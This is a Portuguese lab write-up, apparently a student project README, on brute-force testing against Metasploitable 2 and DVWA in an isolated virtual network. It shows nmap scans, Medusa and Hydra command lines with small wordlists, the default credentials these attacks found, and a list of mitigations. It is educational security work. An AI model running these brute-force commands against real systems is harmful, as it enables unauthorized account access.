# Simulação de Ataques de Força Bruta com Kali Linux e Medusa em Ambiente Controlado

## 📖 Sobre o Projeto

Este projeto tem como objetivo demonstrar, de forma prática e controlada, técnicas de auditoria de autenticação utilizando Kali Linux, Medusa, Hydra, Nmap e scripts personalizados em Python.

Os testes foram executados em um ambiente virtualizado composto por Kali Linux e Metasploitable 2, permitindo a avaliação de mecanismos de autenticação presentes em serviços FTP e aplicações Web vulneráveis, além da análise de cenários corporativos simulados envolvendo enumeração de usuários e password spraying.

⚠️ Todos os testes foram realizados exclusivamente em laboratório isolado e autorizado para fins educacionais.

---

# 🎯 Objetivos

- Configurar um laboratório seguro utilizando máquinas virtuais.
- Realizar descoberta de hosts e serviços.
- Executar testes de autenticação em serviços FTP.
- Simular ataques contra formulários Web vulneráveis.
- Entender as limitações de ferramentas automatizadas.
- Desenvolver soluções próprias para cenários específicos.
- Documentar vulnerabilidades e recomendações de mitigação.

---

# 🖥️ Ambiente Utilizado

## Virtualização

- Oracle VirtualBox

## Máquina Atacante

- Kali Linux

## Máquina Alvo

- Metasploitable 2

## Ferramentas

- Nmap
- Medusa
- Hydra
- Python 3
- FTP
- SMBClient

---

# 🌐 Topologia da Rede

## Rede Host\-Only

| Equipamento | Endereço IP |
| --- | --- |
| Kali Linux | 10.10.10.10 |
| Metasploitable 2 | 10.10.10.30 |

## Rede NAT

Utilizada para acesso externo e conectividade das máquinas virtuais.

---

# 🔍 Fase 1 – Validação de Conectividade

Teste realizado para confirmar a comunicação entre Kali e Metasploitable.

ping \-c 3 10.10.10.30

Resultado:

3 packets transmitted

3 packets received

0% packet loss

✅ Conectividade validada com sucesso.

---

# 🛡️ Fase 2 – Enumeração de Serviços

Reconhecimento inicial da superfície de ataque utilizando Nmap.

nmap \-sV 10.10.10.30

## Serviços Identificados

| Porta | Serviço |
| --- | --- |
| 21 | FTP |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 139 | NetBIOS |
| 445 | SMB |
| 3306 | MySQL |
| 5432 | PostgreSQL |
| 5900 | VNC |
| 8180 | Apache Tomcat |

A quantidade de serviços expostos demonstra um ambiente propositalmente vulnerável para estudos.

---

# 🔐 Fase 3 – Ataque de Força Bruta em FTP

## Construção das Wordlists

### Usuários

echo \-e "user\\nmsfadmin\\nadmin\\nroot" > users.txt

### Senhas

echo \-e "123456\\npassword\\nqwerty\\nmsfadmin" > pass.txt

## Execução do Medusa

medusa \-h 10.10.10.30 \-U users.txt \-P pass.txt \-M ftp \-t 6

## Resultado

ACCOUNT FOUND

User: msfadmin

Password: msfadmin

SUCCESS

## Validação Manual

ftp 10.10.10.30

230 Login successful

✅ Credenciais validadas com sucesso.

---

# 🌐 Fase 4 – Ataque Contra Aplicação Web (DVWA)

Foi utilizado o DVWA (Damn Vulnerable Web Application) para estudo de autenticação baseada em formulários web.

## Tentativa Inicial com Medusa

medusa \-h 10.6.6.13 \-U users.txt \-P pass.txt \-M web\-form

Resultado:

error code 302

Foi identificado que o fluxo de autenticação dependia de:

- Sessão ativa
- Cookies válidos
- Token CSRF
- Redirecionamentos HTTP

---

# 🧪 Fase 5 – Avaliação com Hydra

Como alternativa, foi utilizada a ferramenta Hydra:

hydra \-L users.txt \-P pass.txt 10.6.6.13 http\-post\-form

Apesar dos resultados reportarem:

16 valid passwords found

a validação manual demonstrou a ocorrência de falsos positivos.

✅ Importante aprendizado:

Resultados automatizados devem ser sempre validados manualmente.

---

# 🐍 Fase 6 – Desenvolvimento de Solução em Python

Para lidar corretamente com o fluxo de autenticação do DVWA, foi desenvolvido um script personalizado.

Funcionalidades implementadas:

- Renovação de sessão.
- Captura de token CSRF.
- Manipulação de cookies.
- Tratamento de redirecionamentos.
- Validação do login.

Arquivo:

dvwa\_bruteforce.py

---

# ✅ Resultado da Validação Web

Execução:

python3 dvwa\_bruteforce.py 10.6.6.13 users.txt pass.txt

Resultado:

[VALIDO] admin : password

Credencial Identificada:

| Usuário | Senha |
| --- | --- |
| admin | password |

---

# 🔗 Ataque em Cadeia

O laboratório também explorou conceitos relacionados a:

- Enumeração SMB
- Password Spraying
- Descoberta de usuários
- Correlação de credenciais

Simulando cenários frequentemente observados em ambientes corporativos.

---

# 🚨 Vulnerabilidades Identificadas

## FTP

- Credenciais previsíveis
- Senhas fracas
- Ausência de bloqueio por tentativas

## Aplicação Web

- Uso de credenciais padrão
- Dependência exclusiva de senha
- Possibilidade de automação das tentativas

## Ambiente Geral

- Grande superfície de ataque
- Diversos serviços expostos
- Configurações propositalmente inseguras

---

# 🛠️ Medidas de Mitigação

## Senhas

- Utilizar senhas fortes.
- Evitar credenciais padrão.
- Implementar expiração periódica.

## Força Bruta

- Limitação de tentativas.
- CAPTCHA.
- MFA.
- Monitoramento de comportamento suspeito.

## Infraestrutura

- Reduzir portas expostas.
- Segmentar redes.
- Desabilitar serviços desnecessários.

## Monitoramento

- Centralização de logs.
- Alertas automáticos.
- Auditorias frequentes.

---

# 📚 Aprendizados Obtidos

Durante o laboratório foi possível compreender:

- Funcionamento de ataques de força bruta.
- Enumeração de serviços e reconhecimento.
- Diferenças entre autenticação FTP e Web.
- Importância dos tokens CSRF.
- Limitações das ferramentas automatizadas.
- Necessidade de validação manual.
- Importância da análise do fluxo da aplicação.

---

# ⚠️ Desafios Encontrados

## Erro na Wordlist

Um erro simples:

ms fadmin

impediu inicialmente a descoberta das credenciais válidas.

Após correção para:

msfadmin

o Medusa identificou corretamente:

Usuário: msfadmin

Senha: msfadmin

---

## Descoberta da Topologia da Rede

Ferramentas utilizadas:

ip \-br a

ip route

arp \-a

ip neigh

nmap \-sn

Hosts identificados:

10.0.2.2  Gateway NAT

10.0.2.3  DNS NAT

10.0.2.4  Serviço interno da virtualização

10.0.2.15 Kali Linux

10.10.10.30 Metasploitable 2

---

# 🏁 Conclusão

O laboratório demonstrou de forma prática como credenciais fracas e configurações inadequadas podem comprometer serviços expostos.

Além da utilização de ferramentas tradicionais como Nmap, Medusa e Hydra, o projeto evidenciou a importância de compreender o funcionamento interno das aplicações para validar resultados e interpretar corretamente os mecanismos de autenticação e segurança.

A atividade proporcionou experiência prática em reconhecimento, enumeração, autenticação e análise de vulnerabilidades dentro de um ambiente controlado e seguro para fins educacionais.

